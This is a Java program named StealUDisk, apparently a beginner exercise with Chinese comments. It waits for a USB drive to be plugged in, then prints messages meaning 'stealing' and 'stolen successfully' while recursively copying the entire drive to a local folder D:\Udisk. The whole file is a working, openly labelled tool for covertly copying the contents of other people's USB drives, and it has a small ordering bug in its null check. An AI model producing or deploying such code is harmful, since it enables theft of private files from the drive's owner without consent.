package com.zth;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.Arrays;

public class StealUDisk {
    public static void main(String[] args) throws Exception{

        File root[] = File.listRoots();
        String rootStr =Arrays.toString(root);
        File target = null;
        System.out.print("等待 U 盘插入：");
        while (true){

            if (File.listRoots().length>root.length){
                System.out.println("\n U 盘已插入");
                File newRoot[] = File.listRoots();

                for (File file: newRoot) {
                    if (-1 ==  rootStr.indexOf(file.toString())){
                        target = file;
                        //System.out.println(file);
                    }
                }
                break;
            }

            System.out.print("*");

            Thread.sleep(3000);
        }

        System.out.println("正在偷窃。。。");
        /**
         * path 保存到本地的路径
         */
        File path = new File("D:\\Udisk");

        copyDisk(target,path);
        System.out.println("偷窃成功。。。");
    }

    private static void copyDisk (File target,File path) throws Exception{
        // 获取第一个名称分隔符的位置
        int firstSeparator = target.getAbsolutePath().indexOf("\\");
        // 对应的路径
        File newFile = new File(path,target.getAbsolutePath().substring(firstSeparator+1));
        //E:\Java 新卓越\liu\2018.11.20\pic06.png
        if (target.isDirectory()){
            //新建文件夹，去掉盘符，建立新路径
            newFile.mkdirs();
            // 获取当前目录下的文件
            File[] files = target.listFiles();

            if (files.length !=0 && files != null){
                for (File file:files) {
                    copyDisk(file,path);
                }
            }


        }else {
            // 在对应目录下复制文件
            FileOutputStream outputStream = new FileOutputStream(newFile);
            FileInputStream inputStream = new FileInputStream(target);

            byte[] buffer = new byte[1024*4];

            int len = -1;

            while (-1 != (len = inputStream.read(buffer) )){
                outputStream.write(buffer,0,len);
            }

            outputStream.close();
            inputStream.close();
        }
    }
}
